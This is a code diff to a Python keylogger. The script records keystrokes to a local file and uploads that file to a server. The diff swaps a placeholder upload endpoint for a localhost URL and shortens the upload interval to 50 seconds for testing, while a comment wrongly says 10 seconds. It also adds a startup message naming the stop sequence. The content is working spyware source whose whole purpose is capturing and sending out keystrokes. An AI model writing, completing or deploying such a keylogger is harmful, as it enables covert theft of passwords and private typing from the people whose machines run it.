@@ -7,7 +7,7 @@ import uuid
 # Define the sequence to stop the keylogger (case-sensitive)
 stop_sequence = "daddy"
 current_sequence = ""
-
+serverURL="http://localhost:5000/upload"
 # Track Shift key state
 shift_pressed = False
 
@@ -73,7 +73,7 @@ def on_release(key):
 def upload_file():
     try:
         with open("keyfile1.txt", 'rb') as file:
-            response = requests.post('YOUR_ENDPOINT_URL', files={'file': file})
+            response = requests.post(serverURL, files={'file': file})
             if response.status_code == 200:
                 print("File uploaded successfully.")
                 response_data = response.json()
@@ -87,12 +87,15 @@ def upload_file():
         print(f"Error during file upload: {e}")
 
 # Schedule the file upload every hour
-schedule.every().hour.do(upload_file)
+#schedule.every().hour.do(upload_file)
+
+# Schedule the file upload every 10 seconds for testing
+schedule.every(50).seconds.do(upload_file)
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=on_press, on_release=on_release)
     listener.start()
-    
+    print("Keylogger started. Press 'daddy' to stop.")
     while True:
         schedule.run_pending()
         time.sleep(1)
